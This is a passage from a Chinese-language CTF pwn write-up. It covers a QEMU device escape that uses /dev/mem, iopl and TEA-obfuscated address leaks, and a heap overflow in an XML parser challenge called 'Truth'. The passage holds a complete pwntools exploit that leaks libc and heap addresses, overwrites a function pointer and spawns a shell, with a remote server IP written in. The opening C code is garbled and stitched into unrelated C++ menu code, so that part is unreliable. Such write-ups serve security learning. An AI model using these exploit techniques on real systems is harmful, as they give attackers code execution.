        outl(value,pmio_base + addr);
    }
    uint8_t pmio_read(uint32_t addr)
    {
        return (uint32_t)inl(pmio_base + addr);
    }
    //加密函数  
    void my_tea_encrypt (uint32_t* v, uint32_t* k) {  
        uint32_t v0=v[0], v1=v[1];
        int sum=0xC6EF3720, i;           /* set up */  
        uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */  
        do{
            v1 -= ((v0>5) + k3);  
            v0 -= ((v1>5) + k1);  
            sum += 0x61C88647;  
        }while(sum);                                            /* end cycle */  
        v[0]=v0; v[1]=v1;  
    } 
    //解密函数  
    void my_tea_decrypt (uint32_t* v, uint32_t* k) {  
        uint32_t v0=v[0], v1=v[1];
        int sum=0, i;  /* set up */  
        uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */  
        do{
            sum -= 0x61C88647;  
            v0 += ((v1>5) + k1);  
            v1 += ((v0>5) + k3);  
        }while(sum != 0xC6EF3720);                                              /* end cycle */  
        v[0]=v0; v[1]=v1;
    }
    int main(){
      system( "mknod -m 660 /dev/mem c 1 1" );
      mmio_mem = mem_map("/dev/mem", mmio_addr, mmio_size);
      if (!mmio_mem){
          die("mmio or vga mmap failed");
      }
      printf("get process address\n");
      if(iopl(3)!=0){
        printf("iopl 3 failed\n");
        exit(0);
      }
      pmio_write(4, 0);
      pmio_write(8, 0x100);
      uint32_t res[2];
      res[0] = mmio_read(3 > 32;
      my_tea_encrypt(res, key);
      uint64_t en_system_address = ((uint64_t )res[1]) > choice;
            switch (choice)
            {
            case 1:
                char temp;
                cout > nodeName >> content;
                xmlfile.editXML(nodeName, content);
                break;
            case 3:
                pnode(*xmlfile.node->begin(), "");
                break;
            case 4:
                cout > nodeName;
                if (auto temp = pnode(*xmlfile.node->begin(), "", nodeName)) 
                    temp->meme(temp->backup);
                break;
            default:
                break;
            }
这里大致说一下，首先是`parseXML`函数，函数会根据`xml`的格式依次递归解析，每个标签都是一个`node`，用结构体`XML_NODE`来进行表示。在`parse`过程中最值得注意的就是`XML_NODE::parseNodeContents`中的处理逻辑
    while (*current)
        {
            switch (*current)
            {
            /*
            case CHARACTACTERS::LT:
            case CHARACTACTERS::NEWLINE:
                    case CHARACTACTERS::BLANK:
            */
            default:
            {
                auto lt = iterFind(current, CHARACTACTERS::LT);
                data = std::make_shared (current, lt);
                backup = (char*)malloc(0x50);
                current = lt;
                break;
            }
            }
        }
该函数在处理完标签的左半部分的时候发生调用如果没有遇到上述的三种情况也就是`data`中的字符的长度
    char* XML_NODE::isInsertable(int x)
    {
        if (x > 0x50 || x data->length(); i++)
    {
      a->backup[i] = (*a->data)[i];
    }
    *(a->data) = content;
接着看一下第三个功能也就是`show`函数，这里通过`pnode`函数打印出了用户指定的`Node`结构体的内容，包含`xml`中的属性字段以及`data`。
接着就是最后一个函数，类似于一个后门函数，调用了结构体中的一个函数指针，打印出了`backup`的内容
###  利用
这里可能是优化导致的问题，`edit`函数中的针对`data`的长度检查失效了，导致用户针对`backup`可以任意长度的堆溢出。而从调试中我们可以发现如果我们输入下面的`XML`，`backup`堆块相邻的位置存在一个`node`结构体
      data
    /bin/sh
也就是`backup`堆块与`Lin2`结构体相邻。这里我们就可以直接覆写结构体了，一个`Node`结构体的布局如下
    pwndbg> x/30gx 0xab0c30-0x20
    0xab0c10:       0x0000000000000000      0x00000000000000a1
    0xab0c20:       0x00000000004054e0      0x0000000100000002
    0xab0c30:       0x0000000000405340（meme函数指针存储地址）      0x0000000000ab0c48 堆地址
    0xab0c40:       0x0000000000000003      0x00007fff006e694c
    0xab0c50:       0x00007fffec193a00      0x0000000000000000
    0xab0c60:       0x0000000000000000      0x0000000000ab11d0
    0xab0c70:       0x0000000000ab11d0      0x0000000000ab11d0
    0xab0c80:       0x0000000000000001      0x0000000000ab0e40
    0xab0c90:       0x0000000000ab0e30      0x0000000000ab1390
    0xab0ca0:       0x0000000000ab1380      0x0000000000ab0f00(backup)
根据结构体中的指针泄漏得到`heap address`，接着覆写结构体中的函数指针，利用第四个函数`getshell`。
这里还差一个`libc`基地址的泄露。这里也可以根据`backup`得到，在`data = std::make_shared
(current, lt);`语句执行完毕之后会产生一个和`data`大小相同的堆块，如果此堆块为`unsorted
bin`，那么我们可以直接通过打印`backup`来泄漏得到`libc`基地址。
###  EXP
        # encoding=utf-8
    from pwn import *
    file_path = "./Truth"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    if debug:
        p = process([file_path])
        gdb.attach(p)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207]
    else:
        p = remote('106.14.216.214', 45116)
        libc = ELF('./libc-2.23.so')
        one_gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207]
    def parse(file_content):
        p.sendlineafter("Choice: ", "1")
        p.sendafter("file's content\n", file_content)
        p.sendline("\xff")
    def edit(name, content):
        p.sendlineafter("Choice: ", "2")
        p.sendlineafter("to edit\n", name)
        p.sendline(content)
    def show():
        p.sendlineafter("Choice: ", "3")
    def show_backup(name):
        p.sendlineafter("Choice: ", "4")
        p.sendlineafter("MEME", name)
    file_content = '''
    /bin/sh
    /bin/sh
    '''.format("a"*0x500)
    file_content += "a" * 0x70 + "b"*0x7
    file_content += '''
    /bin/sh
    '''
    parse(file_content)
    show_backup("Lin")
    p.recvuntil("Useless")
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 88 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address is {}".format(hex(libc.address)))
    edit("Lin", "1212")
    show_backup("Lin")
    p.recvuntil("b" * 0x7)
    p.recvline()
    heap_address = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success("heap address is {}".format(hex(heap_address)))
    edit("Lin3", b"/bin/sh\x00" + p64(one_gadget[3] + libc.address))
    edit("Lin3", b"/bin/sh\x00" + p64(one_gadget[3] + libc.address))
    payload = b"a"*0x70 + p64(heap_address- 0x1e0)
    edit("Lin", payload)
    edit("Lin", payload)
    show_backup("Lin4")
    p.interactive()
## 参考
[TEA、XTEA、XXTEA加密解密算法](https://www.jianshu.com/p/4272e0805da3)